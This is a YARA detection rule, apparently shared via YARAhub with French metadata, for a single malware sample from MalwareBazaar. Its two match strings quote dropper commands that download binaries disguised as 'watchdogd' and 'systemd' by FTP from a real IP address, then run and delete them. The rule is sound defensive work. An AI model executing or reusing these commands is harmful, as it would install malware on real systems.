rule SCRIPT_Sample_Unique_1e5e56d2 {
    meta:
        description = "Specimen unique (soumission Bazaar) - strings distinctifs propres au sample"
        author      = "Marjoriefort"
        date        = "2026-09-17"
        reference   = "1e5e56d2ffc990b1dd966e12a02d89d7dcad92c2f23c34834fbfa8c792d56520.unknown"
        confidence  = "low"
        note        = "Regle specimen : vise la re-soumission identique. Verifier en sandbox."
        yarahub_uuid              = "b072c31e-f36e-4482-a899-28475fee9eef"
        yarahub_license           = "CC0 1.0"
        yarahub_reference_md5     = "e828520d44a8648cd352a42713e51be5"
        yarahub_reference_link    = "https://github.com/Marjoriefort/yara-rules"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp  = "TLP:WHITE"
    strings:
        $a = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 213.232.114.14 watchdogd watchdogd; chmod 777 watchdogd ./watchdogd; rm -rf watchdogd" ascii wide
        $b = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 213.232.114.14 systemd systemd; chmod 777 systemd ./systemd; rm -rf systemd" ascii wide
    condition:
        all of them
}
